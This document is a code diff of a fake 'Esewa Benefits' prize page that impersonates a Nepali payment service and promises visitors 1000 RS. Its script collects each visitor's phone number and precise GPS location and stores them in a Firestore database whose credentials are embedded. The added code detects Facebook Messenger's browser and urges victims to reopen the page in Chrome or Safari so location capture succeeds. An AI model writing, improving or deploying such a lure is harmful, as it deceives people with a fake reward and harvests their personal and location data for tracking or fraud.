@@ -5,12 +5,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Esewa Benefits</title>
+
     <script type="module">
-        // Firebase SDK initialization
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBGCdAM9Qbhr_FfBFPRO5l7_09wvNFRh-s",
             authDomain: "fir-app-7eae8.firebaseapp.com",
@@ -21,8 +20,8 @@
             appId: "1:588779148159:web:eabe408532a8236afd804a"
         };
 
-        // Initialize Firebase
-        let app, db;
+        let app;
+        let db;
         try {
             app = initializeApp(firebaseConfig);
             db = getFirestore(app);
@@ -31,7 +30,18 @@
             console.error("Error initializing Firebase:", error);
         }
 
-        // Function to handle "Get Prize" button click
+        // Detect if user is inside Messenger app
+        function isMessengerBrowser() {
+            return /FBAN|FBAV/i.test(navigator.userAgent);
+        }
+
+        // Redirect to default browser if inside Messenger
+        function redirectIfMessenger() {
+            if (isMessengerBrowser()) {
+                document.getElementById("messengerWarning").style.display = "block";
+            }
+        }
+
         window.getPrize = async function () {
             const errorDiv = document.getElementById("error");
             const prizeDiv = document.getElementById("prize");
@@ -46,8 +56,8 @@
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
-                    prizeDiv.innerHTML = `<p>🎉 Congratulations! You have won 1000 RS in Esewa Nepal! 🎉</p>`;
-                    prizeDiv.style.display = "block";
+                    prizeDiv.innerHTML = `<p>🎉 Congratulations! You have won 1000 RS in Esewa Nepal!</p>`;
+                    prizeDiv.style.display = "block"; 
 
                     if (!db) {
                         errorDiv.textContent = "Error: Firestore not initialized.";
@@ -55,31 +65,28 @@
                     }
 
                     try {
-                        const docRef = await addDoc(collection(db, "prizes"), {
+                        await addDoc(collection(db, "prizes"), {
                             phoneNumber: document.getElementById("phoneNumber").value,
-                            latitude: latitude,
-                            longitude: longitude,
+                            latitude,
+                            longitude,
                             timestamp: serverTimestamp()
                         });
-                        console.log("Prize data saved to Firebase, Document ID:", docRef.id);
+                        console.log("Prize data saved successfully");
                     } catch (error) {
                         errorDiv.textContent = "Error saving data: " + error.message;
-                        console.error("Error saving prize data:", error);
                     }
                 },
                 (err) => {
-                    let errorMessage = "Error retrieving location. Please enable location services.";
+                    console.error("Geolocation error:", err);
+                    errorDiv.textContent = "Error: " + err.message;
 
                     if (err.code === 1) {
-                        errorMessage = "Location access denied. Please allow location access in your phone settings.";
+                        alert("❌ Location access denied! Please enable location in your device settings.");
                     } else if (err.code === 2) {
-                        errorMessage = "Location unavailable. Please try again later.";
+                        alert("⚠️ Unable to retrieve location. Try again in an open area.");
                     } else if (err.code === 3) {
-                        errorMessage = "Location request timed out. Try again.";
+                        alert("⏳ Location request timed out. Try again.");
                     }
-
-                    errorDiv.textContent = errorMessage;
-                    console.error("Geolocation error:", err);
                 },
                 {
                     enableHighAccuracy: true,
@@ -89,18 +96,19 @@
             );
         };
 
-        // Function to show prize page after phone number submission
         window.showPrizePage = function () {
-            const phoneNumber = document.getElementById("phoneNumber").value.trim();
+            const phoneNumber = document.getElementById("phoneNumber").value;
 
             if (!phoneNumber) {
-                alert("📱 Please enter your phone number to proceed.");
+                alert("📞 Please enter your phone number to continue.");
                 return;
             }
 
             document.getElementById("phoneNumberSection").style.display = "none";
             document.getElementById("prizeSection").style.display = "block";
-        }
+        };
+
+        document.addEventListener("DOMContentLoaded", redirectIfMessenger);
     </script>
 
     <style>
@@ -114,6 +122,7 @@
             background-size: cover;
             font-family: 'Roboto', sans-serif;
             color: white;
+            text-align: center;
         }
 
         h1 {
@@ -139,8 +148,7 @@
             transform: scale(1.1);
         }
 
-        .phone-number-section,
-        .prize-info {
+        .phone-number-section, .prize-info {
             padding: 30px;
             background: rgba(0, 0, 0, 0.6);
             border-radius: 10px;
@@ -159,7 +167,6 @@
             border: 2px solid #ccc;
             font-size: 16px;
             width: 80%;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
             background-color: #f9f9f9;
         }
 
@@ -185,6 +192,16 @@
             margin: 20px 0;
         }
 
+        #messengerWarning {
+            display: none;
+            background-color: yellow;
+            color: black;
+            padding: 10px;
+            margin-top: 20px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
         @media (max-width: 768px) {
             body {
                 padding: 20px;
@@ -202,10 +219,15 @@
     </div>
 
     <div id="prizeSection" style="display: none;" class="phone-number-section">
-        <p>Click the button below to see if you’ve won 1000 in Esewa Nepal!</p>
+        <p>Click the button below to check if you won 1000 RS!</p>
         <button onclick="getPrize()">Get Prize</button>
         <div id="prize" class="prize-info"></div>
         <p id="error" class="error"></p>
+    </div>
+
+    <div id="messengerWarning">
+        ⚠️ This browser does not support location access. <br>
+        👉 Please open this page in **Chrome or Safari** for better experience.
     </div>
 </body>
 
